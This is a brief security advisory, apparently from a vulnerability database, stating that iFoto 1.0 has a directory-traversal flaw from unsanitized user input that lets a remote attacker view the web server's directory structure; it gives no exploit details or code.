iFoto is prone to a directory-traversal vulnerability because it fails to properly sanitize user-supplied input.

A remote attacker can exploit this issue to view the directory structure of the affected computer within the context of the webserver.

This issue affects iFoto 1.0; other versions may also be affected.
